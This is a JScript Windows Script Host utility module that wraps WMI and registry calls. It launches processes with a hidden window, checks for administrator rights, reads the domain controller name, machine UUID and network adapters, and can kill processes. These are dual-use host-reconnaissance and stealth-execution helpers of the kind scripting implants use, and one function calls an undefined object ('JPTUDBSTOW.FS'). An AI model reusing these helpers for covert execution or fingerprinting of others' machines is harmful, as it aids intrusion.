////////////////////////////////////////////////////////////////////////
// System API
////////////////////////////////////////////////////////////////////////

var SHELL = require("lib/shell");
var WSH = CreateObject("WScript.Shell");
var WMI = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var FSO = CreateObject("Scripting.FileSystemObject");

exports.VERSIONINFO = "System Module (system.js) version 0.1";
exports.global = global;
exports.require = global.require;

exports.createProcess = function(cmd) {
    var SW_HIDE = 0;
    var pid = 0;

    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
    var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
    si.ShowWindow = SW_HIDE;
    si.CreateFlags = 16777216;
    si.X = si.Y = si.XSize = si.ySize = 1;

    //wmi.Get("Win32_Process").Create(cmd, null, si, pid);
    var w32proc = wmi.Get("Win32_Process");

    var method = w32proc.Methods_.Item("Create");
    var inParams = method.InParameters.SpawnInstance_();
    inParams.CommandLine = cmd;
    inParams.CurrentDirectory = null;
    inParams.ProcessStartupInformation = si;

    var outParams = w32proc.ExecMethod_("Create", inParams);
    return outParams.ProcessId;
};

exports.getEnvString = function(path) {
    return WSH.ExpandEnvironmentStrings('%' + path + '%');
};

exports.get32BitFolder = function() {
    var base = exports.getEnvString("WINDIR");
    var syswow64 = base + "\\SysWOW64\\";

    if (JPTUDBSTOW.FS.FolderExists(syswow64))
        return syswow64;

    return base + "\\System32\\";
}

exports.isElevated = function() {
    try {
        WSH.RegRead("HKEY_USERS\\s-1-5-19\\");
        return true;
    } catch (e) {
        return false;
    }
};

exports.getOS =  function() {
    try {
        var colItems = WMI.ExecQuery("SELECT * FROM Win32_OperatingSystem");
        var enumItems = new Enumerator(colItems);
        var objItem = enumItems.item();
        return objItem.Caption.rtrim();
    } catch (e) {}
};

exports.getDCName = function() {
    try {
        var DC = WSH.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
        if (DC.length > 0)
            return DC;
    } catch (e) {}
};

exports.getArch = function() {
    try {
        var colItems = WMI.ExecQuery("SELECT * FROM Win32_OperatingSystem");
        var enumItems = new Enumerator(colItems);
        var objItem = enumItems.item();
        return objItem.OSArchitecture;
    } catch (e) {}
};

exports.getUUID = function() {
    try {
        var colItems = WMI.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct");
        var enumItems = new Enumerator(colItems);
        var objItem = enumItems.item();
        return objItem.UUID.toLowerCase();
    } catch (e) {}
};

exports.getCurrentWorkingDirectory = function() {
    try {
        cwd = SHELL.exec("cd", "cwd.txt").rtrim();
        return cwd;
    } catch (e) {}
};

// "console only";
exports.getCurrentScriptDirectory = function() {
    if(typeof(WScript) !== "undefined") {
        var path = WScript.ScriptFullName;
        var pos = path.lastIndexOf("\\");
        return path.substring(0, pos);
    } else {
        return ".";
    }
};

// "console only";
exports.getCurrentScriptName = function() {
    if(typeof(WScript) !== "undefined") {
        return WScript.ScriptName;
    } else {
        return "";
    }
};

exports.getNetworkInterfaces = function() {
    var wbemFlagReturnImmediately = 0x10;
    var wbemFlagForwardOnly = 0x20;
    var rows = [];

    try {
        var colItems = WMI.ExecQuery(
            "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True",
            "WQL",
            wbemFlagReturnImmediately | wbemFlagForwardOnly
        );

        var enumItems = new Enumerator(colItems);
        for (; !enumItems.atEnd(); enumItems.moveNext()) {
            var objItem = enumItems.item();
            try {
                rows.push({
                    Caption: objItem.Caption,
                    IPAddress: objItem.IPAddress.toArray().join(','),
                    MACAddress: objItem.MACAddress
                });
            } catch(e) {}
        }
    } catch(e) {}

    return rows;
};

exports.getProcessList = function() {
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var query = "Select * From Win32_Process";

    return wmi.ExecQuery(query);
};

exports.killProcess = function(pid) {
    var processes = exports.getProcessList();

    var items = new Enumerator(processes);
    while (!items.atEnd()) {
        var proc = items.item();

        try {
            if (proc.ProcessId == pid) {
                proc.Terminate();
                return true;
            }
        } catch (e) {}

        items.moveNext();
    }

    return false;
};

exports.createShortcut = function(shoutcutName, fileName) {
    var workingDirectory = exports.getCurrentWorkingDirectory();
    var desktopPath = WSH.SpecialFolders("Desktop");
    var link = WSH.CreateShortcut(desktopPath + "\\" + shoutcutName + ".lnk");
    link.IconLocation = fileName + ",1";
    link.TargetPath = workingDirectory + "\\" + fileName;
    link.WindowStyle = 3;
    link.WorkingDirectory = workingDirectory;
    link.Save();
};
